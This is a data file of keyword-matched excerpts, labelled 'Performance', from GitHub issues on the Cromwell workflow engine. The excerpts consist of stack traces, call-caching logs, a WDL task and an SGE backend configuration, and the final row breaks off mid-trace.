Performance,".locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-9"" #48 daemon prio=5 os_prio=31 tid=0x00007fb76b529800 nid=0x8903 waiting on condition [0x00000001315a1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-8"" #47 daemon prio=5 os_prio=31 tid=0x00007fb76b518000 nid=0x8703 waiting on condition [0x000000013149e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concur",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:29339,concurren,concurrent,29339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,.map(Traversable.scala:104) ~[cromwell.jar:0.19];   at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19];   at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19];   at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19];   at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19];   at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19];   at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19];   at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19];   at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19];   at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/810:6108,concurren,concurrent,6108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/810,6,['concurren'],['concurrent']
Performance,.netty.handler.ssl.SslHandler$SslTasksRunner.resumeOnEventExecutor(SslHandler.java:1718); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$Abstrac,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:6748,concurren,concurrent,6748,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['concurren'],['concurrent']
Performance,".phenotype:-1:1 cache hit copying success with aggregated hashes: initial = 018D1BC619E22671C2125EEDE82AB210, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,36] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.phenotype:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,37] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.date_of_death:-1:1-20000000026 [9e4f5894main.date_of_death:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,37] [info] BT-322 9e4f5894:main.date_of_death:-1:1 cache hit copying success with aggregated hashes: initial = 179EA0EE9B87629C24E64D33DEB38610, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,37] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.date_of_death:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,67] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.white_brits:-1:1-20000000000 [9e4f5894main.white_brits:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,68] [info] BT-322 9e4f5894:main.white_brits:-1:1 cache hit copying success with aggregated hashes: initial = EB2F16A657136E0208581A7B6A7F020F, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,68] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.white_brits:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.year_of_birth' (scatter index: None, attempt 1); [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.phenotype' (scatter inde",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:26489,cache,cache,26489,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); cromwell_1 | at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); cromwell_1 | at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); cromwell_1 | at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); cromwell_1 | at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); cromwell_1 | at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); cromwell_1 | at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); cromwell_1 | at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); cromwell_1 | at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); cromwell_1 | at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); cromwell_1 | at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); cromwell_1 | at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); cromwell_1 | at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); cromwell_1 | at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); cromwell_1 | at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); cromwell_1 | at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); cromwell_1 | at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); cromwell_1 | at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4337:2963,concurren,concurrent,2963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4337,2,['concurren'],['concurrent']
Performance,".py) \; ${write_tsv(fastqs)} \; --adapters ${write_tsv(adapters)} \; ${if paired_end then ""--paired-end"" else """"} \; ${if select_first([auto_detect_adapter,false]) then ""--auto-detect-adapter"" else """"} \; ${""--min-trim-len "" + select_first([min_trim_len,5])} \; ${""--err-rate "" + select_first([err_rate,'0.1'])} \; ${""--nth "" + select_first([cpu,2])}; }; output {; # WDL glob() globs in an alphabetical order; # so R1 and R2 can be switched, which results in an; # unexpected behavior of a workflow; # so we prepend merge_fastqs_'end'_ (R1 or R2); # to the basename of original filename; # this prefix will be later stripped in bowtie2 task; Array[File] trimmed_merged_fastqs = glob(""merge_fastqs_R?_*.fastq.gz""); }; runtime {; cpu : select_first([cpu,2]); memory : ""${select_first([mem_mb,'12000'])} MB""; time : select_first([time_hr,24]); disks : select_first([disks,""local-disk 100 HDD""]); }; }; ```. My backend.conf :; ```; include required(classpath(""application"")). backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-attributes= """"""; Int? cpu=1; Int? memory=4; String? disks; String? time; String? preemptible; """"""; submit = """"""; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe smp ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${out} \; -e ${err} \; ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". filesystems {; local {; localization: [; ""soft-link"",""copy"",""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"",""copy"",""hard-link""]; hashing-strategy: ""file""; }; }; }; }; }; }; }; engine{; filesystems{; local{; localization: [; ""soft-link"",""copy"",""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"",""copy"",""hard-link""]; hashing-strategy: ""file""; }; }; }; }; ```. I wonder if there is something wrong with my config files or if Cromwell's localization is at fault.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3876:4195,concurren,concurrent-job-limit,4195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3876,1,['concurren'],['concurrent-job-limit']
Performance,".run(Callback.scala:127); at cats.effect.internals.Trampoline.cats$effect$internals$Trampoline$$immediateLoop(Trampoline.scala:70); at cats.effect.internals.Trampoline.startLoop(Trampoline.scala:36); at cats.effect.internals.TrampolineEC$JVMTrampoline.super$startLoop(TrampolineEC.scala:93); at cats.effect.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:133); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:120); at cats.effect.Async$$anon$1.run(Async.scala:275); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); [2019-02-11 10:13:19,49] [info] Request threw an exception on attempt #2. Retrying after 1364 milliseconds; java.nio.channels.UnresolvedAddressException: null; at sun.nio.ch.Net.checkAddress(Net.java:101); at sun.nio.ch.UnixAsynchronousSocketChannelImpl.implConnect(UnixAsynchronousSocketChannelImpl.java:301); at sun.nio.ch.AsynchronousSocketChannelImpl.connect(AsynchronousSocketChannelImpl.java:209); at org.http4s.blaze.channel.nio2.ClientChannelFactory.connect(ClientChannelFactory.scala:36); at org.http4s.client.blaze.Http1Support.buildPipeline(Http1Support.scala:53); at org.http4s.client.blaze.Http1Support.$anonfun$makeClient$1(Http1Support.scala:45); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:87); at cats.effect.internals.IORunLoop$RestartCallback.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:5897,concurren,concurrent,5897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['concurren'],['concurrent']
Performance,".run(Callback.scala:127); at cats.effect.internals.Trampoline.cats$effect$internals$Trampoline$$immediateLoop(Trampoline.scala:70); at cats.effect.internals.Trampoline.startLoop(Trampoline.scala:36); at cats.effect.internals.TrampolineEC$JVMTrampoline.super$startLoop(TrampolineEC.scala:93); at cats.effect.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:133); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:120); at cats.effect.Async$$anon$1.run(Async.scala:275); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); [2019-02-11 10:13:20,86] [info] Request threw an exception on attempt #3. Retrying after 6737 milliseconds; java.nio.channels.UnresolvedAddressException: null; at sun.nio.ch.Net.checkAddress(Net.java:101); at sun.nio.ch.UnixAsynchronousSocketChannelImpl.implConnect(UnixAsynchronousSocketChannelImpl.java:301); at sun.nio.ch.AsynchronousSocketChannelImpl.connect(AsynchronousSocketChannelImpl.java:209); at org.http4s.blaze.channel.nio2.ClientChannelFactory.connect(ClientChannelFactory.scala:36); at org.http4s.client.blaze.Http1Support.buildPipeline(Http1Support.scala:53); at org.http4s.client.blaze.Http1Support.$anonfun$makeClient$1(Http1Support.scala:45); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:87); at cats.effect.internals.IORunLoop$RestartCallback.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:8141,concurren,concurrent,8141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['concurren'],['concurrent']
Performance,".run(Callback.scala:127); at cats.effect.internals.Trampoline.cats$effect$internals$Trampoline$$immediateLoop(Trampoline.scala:70); at cats.effect.internals.Trampoline.startLoop(Trampoline.scala:36); at cats.effect.internals.TrampolineEC$JVMTrampoline.super$startLoop(TrampolineEC.scala:93); at cats.effect.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:133); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:120); at cats.effect.Async$$anon$1.run(Async.scala:275); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); [2019-02-11 10:13:21,51] [info] WorkflowExecutionActor-52999e15-953f-44d6-aaae-1774c74d2910 [52999e15]: Starting test1.hello; [2019-02-11 10:13:22,36] [info] Assigned new job execution tokens to the following groups: 52999e15: 1; [2019-02-11 10:13:22,66] [info] BackgroundConfigAsyncJobExecutionActor [52999e15test1.hello:NA:1]: echo ""Hello World"" > World.txt; [2019-02-11 10:13:22,75] [info] BackgroundConfigAsyncJobExecutionActor [52999e15test1.hello:NA:1]: executing: /usr/bin/env bash /spin1/users/wresch/test_data/cromwell/test1/cromwell-executions/test1/52999e15-953f-44d6-aaae-1774c74d2910/call-hello/execution/script; [2019-02-11 10:13:26,29] [info] BackgroundConfigAsyncJobExecutionActor [52999e15test1.hello:NA:1]: job id: 12910; [2019-02-11 10:13:26,30] [info] BackgroundConfigAsyncJobExecutionActo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:10385,concurren,concurrent,10385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['concurren'],['concurrent']
Performance,".run(Callback.scala:127); at cats.effect.internals.Trampoline.cats$effect$internals$Trampoline$$immediateLoop(Trampoline.scala:70); at cats.effect.internals.Trampoline.startLoop(Trampoline.scala:36); at cats.effect.internals.TrampolineEC$JVMTrampoline.super$startLoop(TrampolineEC.scala:93); at cats.effect.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:133); at cats.effect.internals.Callback$AsyncIdempotentCallback.apply(Callback.scala:120); at cats.effect.Async$$anon$1.run(Async.scala:275); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); [2019-02-11 10:13:27,63] [info] Message [cromwell.docker.DockerInfoActor$DockerInfoFailedResponse] from Actor[akka://cromwell-system/user/HealthMonitorDockerHashActor#-638598959] to Actor[akka://cromwell-system/deadLetters] was not delivered. [1] dead letters encountered, no more dead letters will be logged. If this is not an expected behavior, then [Actor[akka://cromwell-system/deadLetters]] may have terminated unexpectedly, This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2019-02-11 10:13:27,65] [info] WorkflowExecutionActor-52999e15-953f-44d6-aaae-1774c74d2910 [52999e15]: Workflow test1 complete. Final Outputs:; {; ""test1.hello.out"": ""/spin1/users/wresch/test_data/cromwell/test1/cromwell-executions/test1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:13597,concurren,concurrent,13597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['concurren'],['concurrent']
Performance,.scala:121); at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionSuccess(StandardAsyncExecutionActor.scala:458); at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionSuccess$(StandardAsyncExecutionActor.scala:455); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionSuccess(ConfigAsyncJobExecutionActor.scala:121); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionResult$3(StandardAsyncExecutionActor.scala:651); at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:302); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:38); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /users/leepc12/code/atac-seq-pipeline/test/cromwell-executions/test/132d7527-a0af-4f08-8291-d935e7cd5632/call-t1/execution/glob-c91e47329777637e2370464651ba47aa.list; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2972:6185,concurren,concurrent,6185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2972,1,['concurren'],['concurrent']
Performance,".scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.Dispatched",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3877,concurren,concurrent,3877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,.scala:257); 	at cromwell.backend.impl.jes.JesInitializationActor.cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile(JesInitializationActor.scala:58); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.scala:52); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.scala:51); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.impl.jes.JesInitializationActor.beforeAll(JesInitializationActor.scala:51); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(BackendWorkflowInitializationActor.scala:156); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(BackendWorkflowInitializationActor.scala:155); 	at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253); 	at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at 